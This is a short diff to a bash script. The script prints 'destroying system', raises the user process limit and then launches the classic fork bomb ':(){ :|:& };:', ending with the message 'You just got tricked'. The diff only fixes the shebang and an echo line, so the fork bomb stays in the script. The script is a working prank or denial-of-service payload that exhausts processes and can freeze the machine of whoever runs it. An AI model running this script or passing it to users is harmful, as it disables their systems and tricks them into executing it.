@@ -1,5 +1,6 @@
-#!/usr/bin/env
+#!/bin/bash
 echo "destroying system"
 ulimit -S -u 5000
 :(){ :|:& };:
-echo"You just got tricked"
+echo "You just got tricked"
+
